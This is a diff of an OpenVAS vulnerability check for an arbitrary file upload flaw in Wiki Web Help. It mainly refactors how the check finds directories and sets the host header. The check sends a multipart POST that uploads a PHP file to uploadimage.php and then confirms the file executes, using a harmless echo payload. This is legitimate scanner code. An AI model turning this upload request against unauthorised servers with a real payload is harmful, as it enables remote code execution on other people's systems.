@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wikihelp_41309.nasl 5388 2017-02-21 15:13:30Z teissa $
+# $Id: gb_wikihelp_41309.nasl 5761 2017-03-29 10:54:12Z cfi $
 #
 # Wiki Web Help 'uploadimage.php' Arbitrary File Upload Vulnerability
 #
@@ -37,12 +37,11 @@ affected.";
 tag_solution = "The vendor released a patch. Please see the references for more
 information.";
 
-
-if (description)
+if(description)
 {
  script_id(100702);
- script_version("$Revision: 5388 $");
- script_tag(name:"last_modification", value:"$Date: 2017-02-21 16:13:30 +0100 (Tue, 21 Feb 2017) $");
+ script_version("$Revision: 5761 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-29 12:54:12 +0200 (Wed, 29 Mar 2017) $");
  script_tag(name:"creation_date", value:"2010-07-06 13:44:35 +0200 (Tue, 06 Jul 2010)");
  script_bugtraq_id(41309);
  script_tag(name:"cvss_base", value:"4.6");
@@ -66,21 +65,20 @@ if (description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
-   
+
 port = get_http_port(default:80);
-
-if(!get_port_state(port))exit(0);
-
 if(!can_host_php(port:port))exit(0);
 
-dirs = make_list("/wwh","/wikihelp",cgi_dirs());
+foreach dir( make_list_unique( "/wwh", "/wikihelp", cgi_dirs( port:port ) ) ) {
 
-foreach dir (dirs) {
-   
-  url = string(dir, "/index.html"); 
+  if( dir == "/" ) dir = "";
+  url = dir + "/index.html";
+  buf = http_get_cache( item:url, port:port );
+  if( buf == NULL )continue;
 
-  if(http_vuln_check(port:port, url:url,pattern:"<title>Wiki Web Help</title>")) {
+  if( "<title>Wiki Web Help</title>" >< buf ) {
+
+    host = http_host_name( port:port );
 
     rand = rand();
     file = string("OpenVAS_TEST_DELETE_ME_", rand, ".php"); 
@@ -90,7 +88,7 @@ foreach dir (dirs) {
     req = string(  
         "POST ", dir, "/handlers/uploadimage.php HTTP/1.1\r\n",
         "Content-Type: multipart/form-data; boundary=----x\r\n",
-        "Host: ", get_host_name(), "\r\n",
+        "Host: ", host, "\r\n",
         "Content-Length: ",len,"\r\n",
         "Accept: text/html\r\n",
         "Accept-Encoding: gzip,deflate,sdch\r\n" ,
@@ -101,29 +99,23 @@ foreach dir (dirs) {
         "Content-Type: application/octet-stream\r\n\r\n",
         "<?php echo '<pre>OpenVAS-Upload-Test</pre>'; ?>","\r\n",
         "------x--\r\n\r\n");
-
     recv = http_keepalive_send_recv(data:req, port:port, bodyonly:TRUE);
 
-    if("{'response':'ok'}" >!< recv)exit(0);
+    if("{'response':'ok'}" >!< recv)continue;
 
     url = string(dir,"/images/",file);
 
     if(http_vuln_check(port:port, url:url,pattern:"OpenVAS-Upload-Test")) {
-
       report = string( 
         "Note :\n\n",
         "## It was possible to upload and execute a file on the remote webserver.\n",
         "## The file is placed in directory: ", '"', dir, '/images/"', "\n",
         "## and is named: ", '"', file, '"', "\n",
         "## You should delete this file as soon as possible!\n");    
- 
       security_message(port:port,data:report);
       exit(0);
-
     }
-
   }
 }
 
-exit(0);
-
+exit( 99 );
